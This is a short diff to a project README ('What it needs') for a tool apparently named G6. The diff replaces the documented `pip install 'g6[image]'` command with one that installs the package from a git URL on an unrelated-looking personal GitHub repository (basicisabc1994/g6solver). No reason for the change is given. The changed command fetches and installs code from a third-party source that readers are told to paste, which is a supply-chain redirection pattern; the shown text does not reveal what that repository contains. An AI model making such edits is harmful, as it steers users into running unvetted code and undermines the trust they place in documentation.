@@ -79,7 +79,7 @@ passages; `g6.grounding` checks a claim against the text read.
 
 ## What it needs
 
-An image-capable `g6.core.llm` caller you give the block, or over MCP the one the person configured; Pillow (`pip install 'g6[image]'`) for the decode check;
+An image-capable `g6.core.llm` caller you give the block, or over MCP the one the person configured; Pillow (`pip install 'g6[image] @ git+https://github.com/basicisabc1994/g6solver'`) for the decode check;
 for `ocr_check`, Tesseract OCR (`tesseract` on PATH; an outside program, Apache-2.0, that you install; G6 never
 installs it). No
 key and no network of its own.
